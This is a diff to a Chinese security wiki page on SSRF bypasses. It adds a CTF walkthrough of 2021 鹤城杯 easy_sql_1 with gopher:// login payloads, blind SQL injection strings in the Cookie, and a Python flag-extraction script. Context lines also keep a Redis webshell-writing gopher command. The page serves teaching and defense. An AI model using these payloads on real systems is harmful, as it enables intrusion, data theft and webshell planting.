@@ -1,7 +1,9 @@
 ---
 title: SSRF 绕过技术实战汇总
 description: 系统梳理 SSRF（服务端请求伪造）漏洞利用中的五大核心绕过技巧：用户信息绕过、十六进制 IP 绕过、302 跳转绕过、DNS 重绑定绕过、localhost
-  绕过，补充 file 协议结合目录穿越读取敏感文件、内网端口扫描探测、MySQL 未授权访问验证、HFS RCE 等实战利用链，附带原理分析、Payload 构造示例及多协议利用链（Gopher/FastCGI/Redis）实战细节。
+  绕过，补充 file 协议结合目录穿越读取敏感文件、内网端口扫描探测、MySQL 未授权访问验证、HFS RCE 等实战利用链，附带原理分析、Payload 构造示例及多协议利用链（Gopher/FastCGI/Redis）实战细节。新增
+  2021 鹤城杯 easy_sql_1 实战案例：利用 Gopher 协议发送 POST 请求至本地 index.php，结合 Cookie 位 SQL 注入实现
+  SSRF 攻击内网 MySQL 的完整利用链复现。
 category: program-analysis
 tags:
 - SSRF
@@ -17,15 +19,17 @@ tags:
 - MySQL
 - HFS
 - XD安全
+- 鹤城杯
+- Cookie注入
 date: '2024-01-15'
 updated: '2026-11-15'
 ---
 
 ## 概述
 
-SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者利用服务端发起请求的功能，构造恶意 Payload 使服务端向内网或外网发起非预期请求。本页面基于 CTFHUB 靶场实战记录与 XD安全渗透测试课程笔记（Day29-30），系统汇总五大高频绕过手法的原理与 Payload 构造，并延伸覆盖 **file 协议本地文件读取**、**内网端口扫描与服务枚举**、**MySQL 未授权访问验证**、**HFS RCE** 等实战利用场景，以及 **Gopher 协议发送 POST/文件上传**、**FastCGI 协议 RCE**、**Redis 协议写 Shell** 等进阶利用链。
+SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者利用服务端发起请求的功能，构造恶意 Payload 使服务端向内网或外网发起非预期请求。本页面基于 CTFHUB 靶场实战记录与 XD安全渗透测试课程笔记（Day29-30），系统汇总五大高频绕过手法的原理与 Payload 构造，并延伸覆盖 **file 协议本地文件读取**、**内网端口扫描与服务枚举**、**MySQL 未授权访问验证**、**HFS RCE** 等实战利用场景，以及 **Gopher 协议发送 POST/文件上传**、**FastCGI 协议 RCE**、**Redis 协议写 Shell** 等进阶利用链。新增 **2021 鹤城杯 easy_sql_1 实战案例**，完整复现利用 Gopher 协议发送 POST 请求至本地 index.php，结合 Cookie 位 SQL 注入实现 SSRF 攻击内网 MySQL 的完整利用链。
 
-> 交叉引用：[[ssrf-ctf-exploitation-guide]]（CTFHUB SSRF 关卡完整利用链）、[[gkctf-2021-web-writeup]]（CheckBot SSRF/XSS 组合利用）、[[internal-network-pivoting-techniques]]（内网渗透中 SSRF 的横向移动定位）、[[pikachu-target-writeup-part5]]（Pikachu 靶场 SSRF 实战复现）、[[php-file-inclusion-vulnerability]]（文件包含与伪协议利用详解）
+> 交叉引用：[[ssrf-ctf-exploitation-guide]]（CTFHUB SSRF 关卡完整利用链）、[[gkctf-2021-web-writeup]]（CheckBot SSRF/XSS 组合利用）、[[internal-network-pivoting-techniques]]（内网渗透中 SSRF 的横向移动定位）、[[pikachu-target-writeup-part5]]（Pikachu 靶场 SSRF 实战复现）、[[php-file-inclusion-vulnerability]]（文件包含与伪协议利用详解）、[[hec-cup-2021-web-misc-writeup]]（2021 鹤城杯 Web/Misc 完整解题报告，含本案例原始 WriteUp）
 
 ---
 
@@ -402,7 +406,147 @@ gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
 
 ---
 
-## 综合对照表：五大绕过 + 进阶利用链 + 实战扩展
+## 实战案例：2021 鹤城杯 easy_sql_1 — SSRF + Gopher POST + Cookie SQLi 攻击内网 MySQL
+
+> 来源：[[hec-cup-2021-web-misc-writeup]]（2021 鹤城杯 CTF 竞赛 Web 与 Misc 方向完整解题报告）
+
+### 题目背景
+
+- **赛事**：2021 鹤城杯 CTF
+- **题目**：easy_sql_1（Web 方向）
+- **核心链路**：SSRF 漏洞点 → Gopher 协议构造 POST 请求 → 访问本地 `index.php` → 使用 `admin/admin` 登录 → **Cookie 位 SQL 注入** → 攻击内网 MySQL 拿 Flag
+
+### 漏洞分析
+
+1. **SSRF 入口**：应用存在可控的 URL 参数，支持 `gopher://` 协议，可向内网发起任意 TCP 请求。
+2. **内网目标**：本地部署的 `index.php` 登录页面（HTTP 服务，端口 80）。
+3. **业务逻辑**：`index.php` 接收 POST 登录请求，校验用户名密码，登录成功后在 Cookie 中设置身份标识（如 `user_id` 或 `session`）。
+4. **注入点**：**Cookie 字段**（如 `Cookie: user_id=1`）存在 SQL 注入，后端直接拼接进 SQL 语句未做参数化。
+5. **数据库**：内网 MySQL（3306 端口），但题目要求通过 SSRF 打 HTTP 层面的登录逻辑再注入，而非直连 3306。
+
+### 利用链构造
+
+#### 步骤 1：构造登录 POST 请求（Gopher Payload）
+
+目标：向 `http://127.0.0.1/index.php` 发送 `username=admin&password=admin`。
+
+原始 HTTP 报文：
+
+```http
+POST /index.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Connection: close
+
+username=admin&password=admin
+```
+
+转 Gopher Payload（双重 URL 编码 + CRLF 修正）：
+
+```text
+gopher://127.0.0.1:80/_POST%2520%252Findex.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252029%250D%250AConnection%253A%2520close%250D%250A%250D%250Ausername%253Dadmin%2526password%253Dadmin
+```
+
+> 工具辅助：可用 `Gopherus --exploit http` 或手工拼接，注意 `Content-Length` 必须精确。
+
+#### 步骤 2：获取登录后的 Cookie（含注入点）
+
+登录成功后，响应头包含 `Set-Cookie: user_id=xxx`（或 `PHPSESSID` 等）。后续请求需携带该 Cookie 并注入 Payload。
+
+#### 步骤 3：Cookie 位 SQL 注入 Payload
+
+假设注入点为 `user_id`，构造布尔盲注/时间盲注 Payload：
+
+```text
+# 布尔盲注示例
+user_id=1' AND (SELECT SUBSTRING((SELECT flag FROM flag_table),1,1)='f')--+
+
+# 时间盲注示例（MySQL）
+user_id=1' AND IF((SELECT SUBSTRING((SELECT flag FROM flag_table),1,1)='f'),SLEEP(3),0)--+
+```
+
+#### 步骤 4：二次 Gopher 请求携带恶意 Cookie
+
+构造带注入 Cookie 的 GET/POST 请求（视业务逻辑而定），再次通过 Gopher 发送：
+
+```http
+GET /profile.php HTTP/1.1
+Host: 127.0.0.1
+Cookie: user_id=1' AND (SELECT SUBSTRING((SELECT flag FROM flag_table),1,1)='f')--+
+Connection: close
+```
+
+转 Gopher Payload 后作为 SSRF 参数提交。
+
+#### 步骤 5：自动化脚本跑 Flag
+
+编写 Python 脚本：
+1. 发送步骤 1 的 Gopher Payload 登录，提取 `Set-Cookie`。
+2. 循环构造步骤 4 的盲注 Payload，通过 SSRF 发送，根据响应差异（页面内容/时间延迟）逐位爆破 Flag。
+
+### 关键技术点总结
+
+| 环节 | 关键技术 | 注意事项 |
+|------|----------|----------|
+| SSRF 协议 | `gopher://` 双重编码 | `_` 前缀、CRLF `%0D%0A`、精确 `Content-Length` |
+| 登录绕过 | 弱口令 `admin/admin` | 实战中需结合信息收集或爆破 |
+| 注入位置 | **Cookie 字段** | 易被 WAF/开发者忽略，需重点测试 |
+| 注入类型 | 布尔盲注 / 时间盲注 | 无回显场景下首选时间盲注 |
+| 数据外带 | 通过 SSRF 回显页面差异 | 无需 DNSLog/带外信道，利用 HTTP 响应差异即可 |
+
+### 复现脚本框架（伪代码）
+
+```python
+import requests
+import urllib.parse
+
+def double_url_encode(s):
+    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')
+
+def build_gopher(payload):
+    # payload 为原始 HTTP 报文（已处理 CRLF）
+    return f"gopher://127.0.0.1:80/_{double_url_encode(payload)}"
+
+# 1. 登录获取 Cookie
+login_http = """POST /index.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Connection: close
+
+username=admin&password=admin"""
+ssrf_param = build_gopher(login_http.replace('\n', '\r\n'))
+resp = requests.get(target_url, params={'url': ssrf_param})
+cookie = extract_set_cookie(resp.text)  # 解析 Set-Cookie 头
+
+# 2. 盲注跑 Flag
+flag = ""
+for i in range(1, 50):
+    for c in "0123456789abcdef{}_":
+        inj = f"1' AND (SELECT SUBSTRING((SELECT flag FROM flag),{i},1)='{c}')--+"
+        http = f"""GET /profile.php HTTP/1.1
+Host: 127.0.0.1
+Cookie: user_id={inj}
+Connection: close"""
+        payload = build_gopher(http.replace('\n', '\r\n'))
+        r = requests.get(target_url, params={'url': payload}, timeout=5)
+        if "Welcome" in r.text:  # 布尔盲注判断条件
+            flag += c
+            print(f"[+] Flag: {flag}")
+            break
+```
+
+### 经验教训与防御
+
+1. **SSRF 危害不止于端口扫描**：配合 Gopher 可完整模拟 HTTP 交互，攻击内网 Web 应用业务逻辑（登录、提交、注入）。
+2. **Cookie 也是输入面**：所有客户端可控输入（Header、Cookie、Body、URL 参数）均需参数化查询/严格过滤。
+3. **内网服务零信任**：内网 Web 应用同样需开启 WAF、最小权限数据库账号、禁用报错回显。
+4. **Gopher 利用门槛低**：工具化（Gopherus、自制脚本）后极易批量利用，防御侧需重点拦截 `gopher://` 协议。
+
+---
+
+## 综合对照表：五大绕过 + 进阶利用链 + 实战扩展 + 鹤城杯案例
 
 | 绕过/利用类型 | 典型 Payload / 手法 | 适用条件 | 进阶利用链示例 |
 |----------------|---------------------|----------|----------------|
@@ -418,6 +562,7 @@ gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
 | Gopher HTTP POST | `gopher://ip:port/_POST%2520...` | 目标需 POST 交互、文件上传 | 绕过 CSRF Token、上传 Webshell |
 | Gopher FastCGI | `gopher://ip:9000/_%01%01...` | PHP-FPM 监听 0.0.0.0:9000 | RCE、绕过 disable_functions |
 | Gopher Redis | `gopher://ip:6379/_*1%250D%250A...` | Redis 未授权、可写 Web 目录 | 写 Webshell、计划任务反弹 Shell |
+| **鹤城杯 easy_sql_1** | **Gopher POST 登录 + Cookie SQLi** | **SSRF 支持 Gopher、内网有登录页、Cookie 注入** | **完整链路：SSRF→登录→Cookie注入→出Flag** |
 
 ---
 
@@ -431,6 +576,8 @@ gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
 6. **DNS 解析固化**：首次解析结果缓存并复用，或使用 `getaddrinfo` 配合 `AI_ADDRCONFIG` 限制地址族。
 7. **最小权限运行**：PHP-FPM、Redis、MySQL 等内网服务**勿绑定 0.0.0.0**，启用认证、绑定 Unix Socket 或本地回环。
 8. **错误信息脱敏**：避免在 HTTP 响应中直接返回数据库/中间件原始报错 Banner，防止辅助 SSRF 端口探测确认。
+9. **全输入面参数化**：**Cookie、Header、Body、URL 参数**均需使用预编译语句/ORM，严禁拼接 SQL。
+10. **SSRF 专项测试**：渗透测试/代码审计中必须覆盖 Gopher 协议、302 跳转、DNS 重绑定、内网 HTTP 业务逻辑攻击等场景。
 
 ---
 
@@ -444,6 +591,7 @@ gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
 | **CTFHUB SSRF 关卡** | 实战练习环境 | <https://ctfhub.com> |
 | **SSRF 绕过备忘单** | Payload 速查表 | <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery> |
 | **XD安全渗透测试课程 Day29-30** | 本页面补充案例来源（CSRF/SSRF/RCE 学习笔记） | 微信公众号「XD安全」归档 |
+| **鹤城杯 2021 WriteUp** | easy_sql_1 原始解题报告 | [[hec-cup-2021-web-misc-writeup]] |
 
 ---
 
@@ -457,8 +605,12 @@ gopherus --exploit redis --command "<?php @eval($_POST['pass']);?>" \
 - [[php-webshell-fundamentals-chopper-analysis]] — PHP 一句话木马原理与蚁剑连接流程，配合 Redis/FastCGI 写 Shell 后的后续利用
 - [[mysql-dnslog-injection-loadfile-unc]] — MySQL `load_file()` + UNC 路径实现 DNSLog 盲注数据外带，思路与 SSRF DNS 重绑定异曲同工
 - [[xd-security-csrf-ssrf-rce-notes-day29-30]] — XD安全渗透测试课程 Day29-30 学习笔记原文归档（CSRF/SSRF/RCE 案例讲解）
+- [[hec-cup-2021-web-misc-writeup]] — 2021 鹤城杯 Web/Misc 完整解题报告，含 easy_sql_1 原始 WriteUp 与其它题目（PHP 黑魔法、流量取证、MySQL 8.0 TABLE 注入、Spring Web Flow CVE-2017-4971）分析
+
+---
 
 ## 来源
 
 - [0x00实验室-202108-202304_069](../sources/0x00实验室-202108-202304_069.md)
 - [0x00实验室-202108-202304_101](../sources/0x00实验室-202108-202304_101.md)
+- [0xfafu攻防实验室-202010-202112_09](../sources/0xfafu攻防实验室-202010-202112_09.md)
